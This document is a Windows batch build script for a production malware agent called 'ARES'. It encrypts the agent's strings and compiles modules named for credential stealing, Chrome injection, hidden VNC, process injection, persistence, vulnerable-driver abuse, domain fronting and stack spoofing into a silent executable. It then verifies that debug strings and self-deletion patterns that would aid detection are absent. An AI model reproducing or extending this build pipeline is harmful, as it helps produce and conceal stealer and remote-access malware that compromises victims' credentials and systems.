@echo off
echo [*] ARES Build - Production (v3.7 - silent by default, no ARES_DEBUG)
echo.

if not exist build mkdir build

echo [1/3] Generating encrypted strings (rolling key 0xA7)...
py tools/gen_full_strings.py
if errorlevel 1 (echo [!] String generation failed & exit /b 1)

echo [2/3] Compiling resources...
windres agent/native/resources.rc -O coff -o build/resources.o 2>NUL
if errorlevel 1 (
    echo [!] windres failed or not found - building without resources
    set RES_OBJ=
) else (
    set RES_OBJ=build/resources.o
)

echo [3/3] Compiling agent...
gcc -Wall -O2 -s -mwindows -fno-ident -ffunction-sections -fdata-sections -Wno-format-truncation -Wno-stringop-truncation -Wno-unused-variable -Wno-unused-function -Wno-unused-but-set-variable -Wno-cpp -Wno-unknown-pragmas -Wno-format -Wl,--gc-sections -I. -o build/ares_prod.exe agent/native/main.c agent/native/core.c agent/native/syscall.c agent/native/stealer.c agent/native/chrome_v20.c agent/native/chrome_inject.c agent/native/socks5.c agent/native/hvnc.c agent/native/inject.c agent/native/persist.c agent/native/byovd.c agent/native/eprocess.c agent/native/bof_loader.c agent/native/domain_front.c agent/native/stack_spoof.c agent/native/cap_loader.c %RES_OBJ% -lkernel32 -luser32 -lws2_32 -lgdi32 -luuid -ladvapi32
if errorlevel 1 (echo [!] Compilation FAILED & exit /b 1)

echo.
echo [+] Build SUCCESS: build/ares_prod.exe
for %%A in (build\ares_prod.exe) do echo [+] Size: %%~zA bytes
echo.
echo [*] Quick checks:
echo     - Debug strings: 
findstr /i "DBG Phase0 winhttp resolve Chromelevator" build\ares_prod.exe >NUL 2>&1
if errorlevel 1 (echo       CLEAN - no debug strings found) else (echo       WARNING - debug strings still present!)
echo     - ShellExecute:
findstr /i "ShellExecute cmd.exe ping.*del" build\ares_prod.exe >NUL 2>&1  
if errorlevel 1 (echo       CLEAN - no ShellExecute patterns) else (echo       WARNING - ShellExecute patterns found!)
echo.
